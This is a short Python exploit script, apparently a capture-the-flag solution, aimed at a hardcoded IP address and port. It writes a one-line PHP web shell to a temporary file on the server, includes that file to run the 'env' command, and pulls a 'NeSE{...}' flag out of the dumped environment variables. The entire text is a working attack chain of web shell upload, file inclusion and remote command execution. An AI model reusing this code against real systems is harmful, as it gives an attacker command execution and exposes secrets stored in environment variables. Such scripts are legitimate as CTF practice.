import requests
import re
from urllib.parse import quote

TARGET_URL = "http://124.16.75.117:51001/"

def exploit():
    webshell = "<?=`$_GET[0]`?>"
    params = {
        'content': webshell
    }
    r = requests.get(TARGET_URL, params=params)
    
    # 提取写入的文件路径
    path_pattern = r"/tmp/[a-f0-9]{32}\.txt"
    match = re.search(path_pattern, r.text)

    file_path = match.group(0)
    params = {
        'file': file_path,
        '0': 'env'  # 获取所有环境变量
    }
    r = requests.get(TARGET_URL, params=params)

    # 使用正则表达式提取flag
    flag_pattern = r"NeSE{.*?}"
    flags = re.findall(flag_pattern, r.text)    
    for flag in set(flags):  # 去重
        print(f"{flag}")

if __name__ == "__main__":
    exploit()